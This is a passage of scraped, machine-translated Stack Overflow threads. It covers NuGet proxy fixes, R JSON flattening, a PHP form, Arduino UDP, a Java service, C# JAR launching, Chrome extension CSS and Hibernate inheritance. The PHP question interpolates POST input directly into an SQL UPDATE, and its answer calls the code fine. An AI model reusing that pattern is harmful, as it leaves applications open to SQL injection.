> 赞同：26
> 
> 时间：2014-03-19T17:02:42.713

This started happening to me quite randomly today on Visual Studio 2012\. A bit simplistic but, after checking if the Nuget site itself was up and trying the Package Manager Console, my solution was to:

**Close and reopen Visual Studio**

Suddenly it could connect to the Nuget server again and download my much needed packages.

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2013-06-13T10:04:41.870

Tools -> Library Package Manager -> Package Manager Settings -> Clear Package Cache

That worked for me

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2015-05-26T11:47:59.780

Clearing the Proxy Cache in IE Fixed this for me. Use these two command lines in the command prompt (run as administrator)

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f 
```

then

```
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /f 
```

The details can be found at [https://support.microsoft.com/en-us/kb/2289942](https://support.microsoft.com/en-us/kb/2289942)

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-12-12T04:02:51.423

I solved it on mine by commenting out the

```
<system.net></system.net> 
```

section from the `devenv.exe.config` located at

```
C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\devenv.exe.config 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2015-11-07T22:29:53.737

Here's how I fixed this issue after none of the suggestions above worked:

Internet Explorer > Tools > Connections > Lan Settings
Uncheck 'Automatically Detect Settings' box. This solved the Nuget Package Manager issue for me. Additionally it fixed another connectivity problem I was having with a VMWare virtual desktop AND... it greatly increased speed in Internet Explorer when trying to connect to secure sites.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-03-04T23:42:12.733

I had this issue with VS 2010 package restore even after updating the Nuget Package Manager to the latest and also unselecting all package sources I could. I was getting an error while enabling the Nuget Package Restore option on the solution.

I resolved this by using a different box that didn't have restricted https access to the nuget server. When I used VS 2012 from a different box to enable package restore, it worked fine. I believe it needs to be able to connect to the nuget online server to download the latest nuget.exe used during restore operations. So one option you can use is to perform the Enable Package Restore process from a server that has all the internet access necessary, and then check-in the changes. Once these changes are checked-in, you can then load the solution again from VS 2010 or VS 2012 and use the nuget restore capabilities.

Hope that helps!

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-03-11T14:09:42.563

Restarted Visual Studio **twice** solved my problem.

First, I restarted but it did not work. Then, I did almost everything but still didn't work.

Then, restarted again solved my problem.

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-11-14T21:18:50.237

I had the same symptoms, and apparently visual studio was using some proxy setting set up in IE. It turned out that my problem was one of the following:

*   My IE had been updated to IE 9, but the update wasn't completed because I hadn't completed the 'update wizard'
*   Some obscure proxy setting was set up in IE (a remnant of a selenium RC test run)

After completing the update wizard, and clearing all proxy settings, my NuGet package manager was working again.

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-10-01T20:26:57.510

Had the same issue, it was solution specific, and none of the above worked. I deleted the visual studio solution user options file (.suo) and restarted VS 2013 and now I can update and install packages again.

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-12-04T05:36:42.470

Finally resolved. I disabled an extension in Chrome. I had installed it to hide my real location.

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-12-19T19:00:44.580

To reset your Internet Explorer proxy settings yourself, follow these steps:1.On Windows XP, click Start, or on Windows Vista or Windows 7, click

2459687, and then click Run. On Windows 8 or Windows 8.1, to access the Run command, press the Windows logo key

Windows logo key+ R. Or, swipe in from the right edge of the screen, and then tap Search (or if you are using a mouse, point to the upper-right corner of the screen, move the mouse pointer down, and then click Search). Type Run in the search box, and then tap or click Run. 2.In the Run text box, copy (CTRL+C) and paste (CTRL+V) or type the following:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f

3.Click OK. 4.On Windows XP, click Start , or on Windows Vista or Windows 7, click

2459687, and then click Run. On Windows 8 or Windows 8.1, to access the Run command, press the Windows logo key

Windows logo key + R. Or, swipe in from the right edge of the screen, and then tap Search (or if you are using a mouse, point to the upper-right corner of the screen, move the mouse pointer down, and then click Search). Type Run in the search box, and then tap or click Run. 5.In the Run text box, copy (CTRL+C) and paste (CTRL+V) or type the following: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /f

6.Click OK.

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2015-11-03T18:51:17.517

i could not install globalize in V.S. 2015 and after trying all the answers i tried this. I opened my project in V.S. 2013 and it worked 1st time. hope this helps somebody else

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2015-11-04T11:29:16.460

Modem re-start fixed my problem.!

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2018-05-08T12:17:41.133

In my case(visual studio 2012-windows10 OS) the problem was with security protocols. Only TLS 1.2 was the enabled protocol and TLS1.1 and TLS1.0 was disabled for some reason. So going into registry and making changes to enable TLS1.0 and TLS1.1 solved the problem.

To enable these protocols you can follow directions on [here](https://www.fastvue.co/tmgreporter/blog/how-to-enable-and-disable-ssl-tls-versions-on-forefront-tmg)

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2018-08-11T01:54:45.273

I fixed it by uninstall the system proxifier : WideCap

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2018-09-16T13:01:23.523

That happened to me when I tried to use Visual Studio from home being connected via public WiFi and my work station was configured to block connections in/out from Internet to VS2017\. Check you local firewall setting and ensure that you have Allow for VS2017 when on Public network. (in Windows Defender Firewall & Advanced Security)

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2018-09-17T18:39:44.070

nugget.org was blocked in my network for security reason so all the nugget packages are installed from Artifactory via JFrog. After configuring my nugget package manager setting to the link provided by my employer the problem is resolved.

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2018-10-22T19:11:43.563

One route that I haven't seen people mentioning is setting the proxy for Nuget in your user folder.

Browse to C:\Users[yourProfile]\AppData\Roaming\Nuget and change your `Nuget.config` file to the following:

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <config>
   <add key="http proxy" value="http://yourProxy.yourCompany.org"/>
  </config>
  <packageSources>
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
  </packageSources>
</configuration> 
```

We set this setting and then Nuget immediately worked.

## Ok, but now I get a credentials prompt!

If you also end up getting a credentials prompt when trying to load packages from Nuget in Visual Studio, you should try to manually browse to [http://www.nuget.org/downloads](http://www.nuget.org/downloads). I've seen proxies like BlueCoat display a Content Filter Warning the first time someone visits a site, and since you can download content from Nuget, it get's flagged.

So you may need to browse there one time to click 'Accept Terms', and then you'll be able to access it.

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2013-04-21T17:08:56.110

Internet 属性 -> LAN 设置 -> 取消选中“自动检测设置”

* * *

## 回答 #22

> 赞同：-2
> 
> 时间：2015-06-03T06:32:04.303

Steps:

1.  Close Fiddler.
2.  Restart Visual Studio.

# json - R：JSON 到 data.frame 的通用展平

> ID：11553592
> 
> 赞同：11
> 
> 时间：2012-07-19T03:39:54.413
> 
> 标签：json, r, dataframe, plyr, data.table

这个问题是关于将任何非循环同构或异构数据结构集合转换为数据帧的通用机制。这在处理许多 JSON 文档的摄取或处理作为字典数组的大型 JSON 文档时特别有用。

有几个 SO 问题涉及处理深度嵌套的 JSON 结构并使用诸如 、 等功能将它们转换为数据帧`plyr`。`lapply`我发现的所有问题和答案都是关于特定案例的，而不是提供处理集合的一般方法复杂的 JSON 数据结构。

在 Python 和 Ruby 中，我通过实现通用数据结构展平实用程序得到了很好的服务，该实用程序使用数据结构中叶节点的路径作为展平数据结构中该节点的值的名称。例如，该值`my_data[['x']][[2]][['y']]`将显示为`result[['x.2.y']]`。

如果一个人拥有这些可能不完全同质的数据结构的集合，那么成功扁平化到数据帧的关键是发现所有可能的数据帧列的名称，例如，通过合并所有的键/名称单独展平的数据结构中的值。

这似乎是一种常见的模式，所以我想知道是否有人已经为 R 构建了这个。如果没有，我会构建它，但是，鉴于 R 独特的基于承诺的数据结构，我会很感激关于实现方法的建议最小化堆抖动。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-12T01:29:07.613

嗨@Sim 我昨天有理由反思你的问题定义：

```
flatten<-function(x) {
    dumnames<-unlist(getnames(x,T))
    dumnames<-gsub("(*.)\\.1","\\1",dumnames)
    repeat {
        x <- do.call(.Primitive("c"), x)
        if(!any(vapply(x, is.list, logical(1)))){
           names(x)<-dumnames
           return(x)
        }
    }
}
getnames<-function(x,recursive){

    nametree <- function(x, parent_name, depth) {
        if (length(x) == 0) 
            return(character(0))
        x_names <- names(x)
        if (is.null(x_names)){ 
            x_names <- seq_along(x)
            x_names <- paste(parent_name, x_names, sep = "")
        }else{ 
            x_names[x_names==""] <- seq_along(x)[x_names==""]
            x_names <- paste(parent_name, x_names, sep = "")
        }
        if (!is.list(x) || (!recursive && depth >= 1L)) 
            return(x_names)
        x_names <- paste(x_names, ".", sep = "")
        lapply(seq_len(length(x)), function(i) nametree(x[[i]], 
            x_names[i], depth + 1L))
    }
    nametree(x, "", 0L)
} 
```

(`getnames`改编自AnnotationDbi:::make.name.tree)

（`flatten`改编自这里的讨论[How to flatten a list to a list without coercion?](https://stackoverflow.com/questions/8139677/how-to-flatten-a-list-to-a-list-without-coercion)）

作为一个简单的例子

```
my_data<-list(x=list(1,list(1,2,y='e'),3))

> my_data[['x']][[2]][['y']]
[1] "e"

> out<-flatten(my_data)
> out
$x.1
[1] 1

$x.2.1
[1] 1

$x.2.2
[1] 2

$x.2.y
[1] "e"

$x.3
[1] 3

> out[['x.2.y']]
[1] "e" 
```

所以结果是一个扁平的列表，大致具有您建议的命名结构。也避免了强制，这是一个优点。

一个更复杂的例子

```
library(RJSONIO)
library(RCurl)
json.data<-getURL("http://www.reddit.com/r/leagueoflegends/.json")
dumdata<-fromJSON(json.data)
out<-flatten(dumdata) 
```

更新

删除尾随 .1 的幼稚方法

```
my_data<-list(x=list(1,list(1,2,y='e'),3))
gsub("(*.)\\.1","\\1",unlist(getnames(my_data,T)))

> gsub("(*.)\\.1","\\1",unlist(getnames(my_data,T)))
[1] "x.1"   "x.2.1" "x.2.2" "x.2.y" "x.3" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-19T09:53:24.663

R 有两个处理 JSON 输入的包：[rjson](http://cran.r-project.org/web/packages/rjson/index.html)和[RJSONIO](http://cran.r-project.org/web/packages/RJSONIO/index.html)。如果我正确理解“非周期性同构或异构数据结构的集合”的意思，我认为这些包中的任何一个都会将这种结构导入为`list`.

`unlist`然后，您可以使用该函数将该列表展平（成向量） 。

如果列表结构适当（每个元素长度相同的非嵌套列表），则`as.data.frame`可以将列表转换为数据框。

一个例子：

```
(my_data <- list(x = list('1' = 1, '2' = list(y = 2))))
unlist(my_data) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-02-22T08:42:57.987

该`jsonlite`包是`RJSONIO`专门设计用于简化 JSON 和数据帧之间的转换的一个分支。您没有提供任何示例`json`数据，但我认为这可能是您正在寻找的。看看这篇[博](https://www.opencpu.org/posts/jsonlite-a-smarter-json-encoder/)文或[小插图](http://cran.r-project.org/web/packages/jsonlite/vignettes/json-mapping.pdf)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-05-22T16:16:32.373

flatten 和 getnames 函数的好答案。花了几分钟弄清楚从 JSON 字符串向量到 data.frame 所需的所有选项，所以我想我会在这里记录下来。假设 jsonvec 是 JSON 字符串的向量。下面构建一个data.frame（data.table），其中每个字符串有一行，每一列对应于JSON树的不同可能的叶子节点。任何缺少特定叶节点的字符串都用 NA 填充。

```
library(data.table)
library(jsonlite)
parsed = lapply(jsonvec, fromJSON, simplifyVector=FALSE)
flattened = lapply(parsed, flatten) #using flatten from accepted answer
d = rbindlist(flattened, fill=TRUE) 
```

# html - HTML 选择 仅返回所选选项的第一个字母

> ID：11553595
> 
> 赞同：1
> 
> 时间：2012-07-19T03:40:10.287
> 
> 标签：html, html-select

我有一个有点像这样的代码

```
<?php
    if($_POST['post'] == 'Post')
    {
        $cat = $_POST['cat'];
        $update = "UPDATE table SET category='$cat' WHERE id = '$id' ";
        $result = mysql_query($update) or die ("update error");             
    }
?>
<form action="#" method="post">
    <select name="cat">
        <option >Arts and Entertainment</option>
        <option >Automotive</option>
        <option >Book Reviews</option>
        <option >Business</option>
        <option >Communications</option>
        <option >Computers and Technology</option>
        <option >Finance</option>
    </select>

    <input type="submit" name="post" value="Post">
</form> 
```

我总结了我的代码以便您轻松获得它，无论我在选项中选择什么，都只会出现选项的第一个字母。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-24T11:48:12.817

您的代码在 PHP 和 HTML 方面似乎都不错。
所以你可能已经`category`用它的 fieldtype`varchar(1)`或`char(1)`.
如果是这种情况，请增加您的`char`or`varchar`长度以说 50。

# udp - Arduino：UDP 发送产生额外字符

> ID：11553597
> 
> 赞同：1
> 
> 时间：2012-07-19T03:41:04.307
> 
> 标签：udp, buffer, arduino, processing, extra

目前我有一个带有以太网屏蔽的 Arduino 板连接到路由器。我的电脑通过 Wi-Fi 连接到这个路由器。我的开发板和我的计算机来回发送[UDP消息。](http://en.wikipedia.org/wiki/User_Datagram_Protocol)我的电脑是客户端，板子是服务器。但是我注意到，当我从我的计算机发送一个较长的 UDP 消息，然后是一个较短的 UDP 消息时，Arduino 接受较短的消息，然后是较长消息中的剩余位。

例如：如果我从我的计算机发送“Hello World”，然后是“Test”；Arduino 不会将第二条消息读为“Test”，而是：“Testo World”。

我认为可能首先是 Arduino 端的问题。Arduino 将消息临时存储在一个名为`packetBuffer`. 我尝试在每次收到新消息之前清除此缓冲区。缓冲区会清除，但随后我会再次收到错误消息。

所以我认为罪魁祸首是计算机，客户端。在计算机端，我有一个发送 UDP 消息的处理草图。下面的例子不是草图本身；然而，到目前为止，这是一个更简单的例子，它仍然提供了我在原始草图中描述的确切症状。

```
import hypermedia.net.*;

UDP udp;  // define the UDP object

void setup() {
    udp = new UDP( this, 6000 );  // Create a new datagram connection on port 6000
    //udp.log( true );            // <-- printout the connection activity
    udp.listen( true );           // and wait for incoming message
}

void keyPressed() {
    String IPaddress  = "192.168.1.177"; // The remote IP address
    int port          = 8888;  // The destination port
    if (keyCode == UP)
    {
        udp.send("Test", IPaddress, port );
    }
    else
        if (keyCode == DOWN)
        {
            udp.send("Hello World", IPaddress, port );
        }
}

void receive( byte[] data ) {    // <-- default handler
    //void receive( byte[] data, String IPaddress, int port ) { // <-- extended handler
    for(int i=0; i < data.length; i++)
        print(char(data[i]));
    println();
} 
```

我怎样才能让草图发送正确的消息？

当然，我非常愿意提供更多信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T13:31:36.283

这个问题没有直接的解决方案。所以我最终求助于解决方法。解决方法涉及向发送到 Arduino 的所有字符串动态添加零，因此始终发送 10 个字符。例如：

如果我要发送“Hello Bot”，则发送的实际字符串是“Hello Bot0”。如果在那之后我发送了一条额外的消息，比如“Test”，那么发送到 Arduino 的字符串将是“Test000000”。额外的零会掩盖重叠的字符。这项工作的一个问题是我必须准备 Arduino 也接受零。这种解决方法对代码来说也有点混乱。不过它确实有效。

这是来自计算机（客户端）端的代码片段。显然，只需调整 Arduino 代码即可解决零。

```
public void Send() {      //bang button named "Send" activates function           
  String txtSend = comField.getText();   //Grab text from a textbox to be sent
  int txtSendLength = txtSend.length();   
  for(int i = 0; i < 10-txtSendLength; i++){  //Add zeros until it has 10 char
    txtSend = txtSend + "0";                
  }
  udp.send(txtSend, ip, port);
  comField.clear();             //Clear the textbox
} 
```

看哪，非常简单粗暴的解决方案！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-07T18:08:21.307

我相信您的问题是正确清除缓冲区。我找到了一行代码，它通过并清除每个字符，因为它是一个字符数组。理论上，一旦读取就没有要清除的缓冲区。采用：

```
for(int i=0;i<UDP_TX_PACKET_MAX_SIZE;i++) packetBuffer[i] = 0; 
```

读取数据后，将清除数组。我还发现，当尝试对接收到的数据进行逻辑处理时，为了控制一些输出，我需要先将 packetBuffer 转换为字符串。在那之后，一切似乎都正常工作。希望有所帮助。

# java - Java 作为具有交互式桌面支持和读取当前登录用户的 Windows 服务

> ID：11553598
> 
> 赞同：1
> 
> 时间：2012-07-19T03:41:17.493
> 
> 标签：java, windows, swing, service, desktop

我有一个 java 程序，它的工作方式类似于使用 apache Common Deamon (prunsrv) 包装的 Windows 服务，但我有两个问题：
1\. 使用交互式桌面配置的服务可以看到摆动对话框并尝试应用程序中的图标。但是没有出现 idalogs 和 try 图标。
2.交互式桌面如何仅与本地系统帐户一起使用应用程序无法读取当前登录的用户，此用户名是应用程序所必需的

然后我需要解决这两个问题，谢谢，我从主类粘贴代码

```
package widget;

import java.awt.AWTException;
import java.awt.Image;
import java.awt.Label;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowStateListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.UIManager;

import widget.controller.NotifyManager;
import widget.utils.Logger;

public class AWidget extends JFrame {
    private static Properties props = null;
    private static String parametersFile = "widget.properties";
    public static String mediaResourcesPath;
    public static String appIcon;
    public static int updateFrecuency = 5;

    String username = "";
    TrayIcon trayIcon;
    SystemTray tray;

    static String activityImages[];

    AWidget() {
        super("Italo Widget");

        mediaResourcesPath = getParameter("mediaResourcesPath");
        appIcon = getParameter("appIcon");

        String val = getParameter("updateFrecuency");

        try {
            updateFrecuency = Integer.parseInt(val);
        } catch (NumberFormatException e) {
            Logger.getTrace().debug("No se pudo leer la frecuencia de actualización de los mensajes");
        }

        updateFrecuency *= 1000;

        username = System.getProperty("user.name");
        username = "Javier";

        System.out.println("creating instance");
        try {
            System.out.println("setting look and feel");
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception e) {
            System.out.println("Unable to set LookAndFeel");
        }

        JPanel panel = new JPanel();

    panel.add(new Label("Usuario: " + username));

    add(panel);

        Image image = Toolkit.getDefaultToolkit().getImage(mediaResourcesPath + "//" + appIcon);

        if (SystemTray.isSupported()) {
            System.out.println("system tray supported");
            tray = SystemTray.getSystemTray();

            ActionListener exitListener = new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    System.out.println("Exiting....");
                    System.exit(0);
                }
            };
            PopupMenu popup = new PopupMenu();
            MenuItem defaultItem = new MenuItem("Exit");
            defaultItem.addActionListener(exitListener);
            popup.add(defaultItem);
            defaultItem = new MenuItem("Open");
            defaultItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    setVisible(true);
                    setExtendedState(JFrame.NORMAL);
                }
            });
            popup.add(defaultItem);

            trayIcon = new TrayIcon(image, "Tareas Italo", popup);
            trayIcon.setImageAutoSize(true);

        } else {
            System.out.println("System tray not supported");
        }
        addWindowStateListener(new WindowStateListener() {
            public void windowStateChanged(WindowEvent e) {
                if (e.getNewState() == ICONIFIED) {
                    try {
                        tray.add(trayIcon);
                        setVisible(false);
                        System.out.println("added to SystemTray");
                    } catch (AWTException ex) {
                        System.out.println("unable to add to tray");
                    }
                }
                if (e.getNewState() == 7) {
                    try {
                        tray.add(trayIcon);
                        setVisible(false);
                        System.out.println("added to SystemTray");
                    } catch (AWTException ex) {
                        System.out.println("unable to add to system tray");
                    }
                }
                if (e.getNewState() == MAXIMIZED_BOTH) {
                    tray.remove(trayIcon);
                    setVisible(true);
                    System.out.println("Tray icon removed");
                }
                if (e.getNewState() == NORMAL) {
                    tray.remove(trayIcon);
                    setVisible(true);
                    System.out.println("Tray icon removed");
                }
            }
        });
        setIconImage(image);

        try {
            tray.add(trayIcon);
            setVisible(false);
            System.out.println("added to SystemTray");
        } catch (AWTException ex) {
            System.out.println("unable to add to tray");
        }

        setSize(300, 200);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    public static void start(String[] args) {
        File f = new File("");
        f = new File(f.getAbsolutePath() + "/conf/running.conf");
        f.delete();

        Logger.getTrace().debug("Iniciando");
        AWidget italoW = new AWidget();
        System.out.println("Instancia");

        new NotifyManager(italoW);
    }
    public static void stop(String[] args) {
        try {
            File f = new File("");
            f = new File(f.getAbsolutePath() + "/conf/running.conf");
            FileWriter fw = new FileWriter(f);
            fw.append("false");
            fw.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            if(args != null && args.length >0) {
                if("stop".equals(args[0])) {
                    File f = new File("");
                    f = new File(f.getAbsolutePath() + "/conf/running.conf");
                    FileWriter fw = new FileWriter(f);
                    fw.append("false");
                    fw.close();

                } else {
                    File f = new File("");
                    f = new File(f.getAbsolutePath() + "/conf/running.conf");
                    f.delete();
                }
            }
            Logger.getTrace().debug("Iniciando");
            AWidget italoW = new AWidget();
            System.out.println("Instancia");

            new NotifyManager(italoW);

        } catch(Throwable th) {
            Logger.getTrace().debug("ERROR:::" + th.getMessage());
        }           
    }

    public void finish(){
        tray.remove(trayIcon);
        dispose();
    }       
} 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-05T18:54:57.267

默认情况下，出于安全原因，Windows 不允许服务与桌面交互。您必须创建两个进程：一个用于唯一的服务部分（作为服务运行，没有任何交互），另一个进程作为 Windows 应用程序标准运行。并在他们之间建立沟通。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-06T21:37:32.620

根据我从您的问题中了解到的情况，您遇到的第二个问题可能是由于您的代码覆盖了从`System.properties`静态调用中收到的用户名字符串，见此处：

> ```
> username = System.getProperty("user.name");
> username = "Javier"; //remove me 
> ```

至于你的其他问题，我会看看你正在使用的包装器。我确定它有某种 API。（我还没有玩过服务......）。

# c# - 使用 Process.Start 启动 JAR：javaw.exe 运行但“没有任何反应”？

> ID：11553599
> 
> 赞同：1
> 
> 时间：2012-07-19T03:41:21.543
> 
> 标签：c#, java

给定代码。单击按钮时没有任何反应，我在 Visual Studio 中没有收到调试消息等。但是，如果我要双击其文件夹中的 .jar 文件，我就可以运行它。有人知道为什么吗？单击按钮时查看任务管理器。javaw.exe 已创建，但没有任何反应。

```
private void btnKinderPuzzle_Click(object sender, RoutedEventArgs e)
{
    // Check if this program is opened
    if (IsProcessOpen("MTPuzzle"))
    {
        MessageBox.Show("KinderPuzzle is already running", "Kinder Package", MessageBoxButton.OK, MessageBoxImage.Information);
    }
    else
    {
        Process.Start(Directory.GetCurrentDirectory() + "\\Puzzle\\PuzzleGame\\MTPuzzle.jar");
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:00:02.420

```
Process.Start("java.exe", 
              Path.Combine("-jar " + Directory.GetCurrentDirectory(), 
                           "Puzzle\\PuzzleGame\\MTPuzzle.jar")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:44:50.380

路径可能不正确。您可以改用

```
Process.Start(Path.Combine(Directory.GetCurrentDirectory(), "Puzzle\\PuzzleGame\\MTPuzzle.jar")); 
```

如果是静止的，那么我认为是Java的设置问题。`run.cmd`要解决此潜在问题，请在您的文件附近创建一个`jar`文件并将此代码写入：

```
java -jar "MTPuzzle.jar" 
```

然后，使用`Process.Start`启动文件`run.cmd`

# javascript - 如何在 Chrome 扩展中使用内容脚本文件注入 CSS？

> ID：11553600
> 
> 赞同：52
> 
> 时间：2012-07-19T03:41:52.127
> 
> 标签：javascript, google-chrome-extension, content-script

我正在尝试从作为内容脚本注入的 JavaScript 注入我的 CSS：

```
"content_scripts": [
   {
      "matches": ["http://www.google.com/*"],
      "js": ["script.js"]
   }
], 
```

我发现了关于注入 CSS 的[类似问题，但是在使用来自](https://stackoverflow.com/questions/9345003/can-i-inject-a-css-file-programmatically-using-a-content-script-js-file)[接受的答案](https://stackoverflow.com/a/9345038/272770)的代码时遇到了问题。这是我的`script.js`内容：

```
var link = document.createElement("link");
link.href = chrome.extension.getURL("style.css");
link.type = "text/css";
link.rel = "stylesheet";
document.getElementsByTagName("head")[0].appendChild(link); 
```

在我加载一些页面后，此消息出现在控制台中：

> 拒绝加载 chrome-extension://phkgaaiaakklogbhkdnpjncedlbamani/fix.css。资源必须列在 web_accessible_resources 清单键中，才能被扩展之外的页面加载。

有没有什么办法解决这一问题？或者，也许是从那个 JavaScript 文件中注入 CSS 的其他方式？

注意：我不能直接从清单中包含样式表。

* * *

## 回答 #1

> 赞同：102
> 
> 时间：2012-07-19T04:50:29.647

您可以添加到清单的权限字段；请参阅[web_accessible_resources](https://developer.chrome.com/extensions/manifest/web_accessible_resources)。因此，您可以将其添加到清单中：

```
 , "web_accessible_resources": [
        "fix.css"
    ] 
```

* * *

另见[“程序注入”](https://developer.chrome.com/extensions/content_scripts#pi)。和[`insertCSS()`](https://developer.chrome.com/extensions/tabs#method-insertCSS)。

对于大多数应用程序，忘记所有`createElement`代码，只需将 CSS 文件添加到清单中：

```
"content_scripts": [
   {
      "matches":    ["http://www.google.com/*"],
      "css":        ["fix.css"],
      "js":         ["script.js"]
   }
], 
```

尽管我知道您不想在这种情况下这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-26T04:31:22.687

您可以使用 element.classList.add("my_new_class") 在元素中添加新类，在 css 中您可以使用新添加的类设置该元素的样式。所以 onClick 只有类将被添加，然后只有该元素的 css 将运行。

# java - JPA/Hibernate 注解不懂继承？

> ID：11553603
> 
> 赞同：0
> 
> 时间：2012-07-19T03:42:22.437
> 
> 标签：java, database, hibernate, jpa, annotations

在尝试使用注释设置我的模式时，我遇到了一些令人沮丧的 Hibernate 行为。假设我有一个与其他几种类型具有一对多关系的实体。例如：

```
@Entity
@Table(name = "clubs")
public class Club {
    private long id;
    private String name;
    //...

    private Collection<ClubLocation> locations;

    public Club() {
        this.name = null;
        //...

        this.locations = Collections.emptyList();
    }

    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    public Long getId() {
        return id;
    }
    public void setId(Long id) {
        this.id = id;
    }

    @Column(nullable = false)
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }

    @OneToMany(mappedBy = "club")
    public Collection<ClubLocation> getLocations() {
        return locations;
    }
    public void setLocations(Collection<ClubLocation> locations) {
        this.locations = locations;
    }
} 
```

现在正如我提到的，我想将此实体与许多其他实体相关联，因此定义一个管理关系的超类实体似乎是个好主意，`Club`这样我就不需要在每个关联的实体中设置关系班级。我这样做使用：

```
@Entity
@Table(name = "clubItems")
@Inheritance(strategy = InheritanceType.JOINED)
public class ClubItem {
    protected Club club;

    public ClubItem() {
        this.club = null;
    }

    @ManyToOne(optional = false)
    public Club getClub() {
        return club;
    }
    public void setClub(Club club) {
        this.club = club;
    }
} 
```

然后我像这样扩展该类：

```
@Entity
@Table(name = "clubLocations")
public class ClubLocation extends ClubItem {
    private String title;
    //...

    public ClubLocation() {
        this.title = null;
        //...
    }

    @Column(nullable = false)
    public String getTitle() {
        return title;
    }
    public void setTitle(String title) {
        this.title = title;
    }
} 
```

一切似乎都很好，除了当我尝试运行然后 Hibernate 爆炸时：

```
org.hibernate.AnnotationException: mappedBy reference an unknown target entity property: ClubLocation.club in Club.locations
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.annotations.CollectionBinder.bindStarToManySecondPass(CollectionBinder.java:543)
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.annotations.CollectionBinder$1.secondPass(CollectionBinder.java:508)
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.CollectionSecondPass.doSecondPass(CollectionSecondPass.java:43)
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.Configuration.secondPassCompile(Configuration.java:1127)
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.AnnotationConfiguration.secondPassCompile(AnnotationConfiguration.java:296)
[WARNING] [talledLocalContainer]    at org.hibernate.cfg.Configuration.buildMappings(Configuration.java:1112)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.Ejb3Configuration.buildMappings(Ejb3Configuration.java:1233)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.EventListenerConfigurator.configure(EventListenerConfigurator.java:154)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.Ejb3Configuration.configure(Ejb3Configuration.java:869)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.Ejb3Configuration.configure(Ejb3Configuration.java:183)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.Ejb3Configuration.configure(Ejb3Configuration.java:240)
[WARNING] [talledLocalContainer]    at org.hibernate.ejb.HibernatePersistence.createEntityManagerFactory(HibernatePersistence.java:120)
[WARNING] [talledLocalContainer]    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:83)
[WARNING] [talledLocalContainer]    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:60) 
```

令人沮丧的是，如果我复制类`club`内部属性的 getter 和 setter 声明`ClubLocation`，一切都很好。具体来说，如果我添加它可以找到：

```
@Override
@ManyToOne(optional = false)
public Club getClub() {
    return super.getClub();
}
public void setClub(Club club) {
    super.setClub(club);
} 
```

...进入`ClubLocation`课堂。但这毫无意义，因为它所做的只是委托给超类。

Hibernate 是否不够复杂，无法在没有在子类中重新声明 getter/setter 的情况下处理继承的映射字段？如果 Hibernate 可以更优雅地处理这种情况，它需要如何设置/我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T06:24:11.640

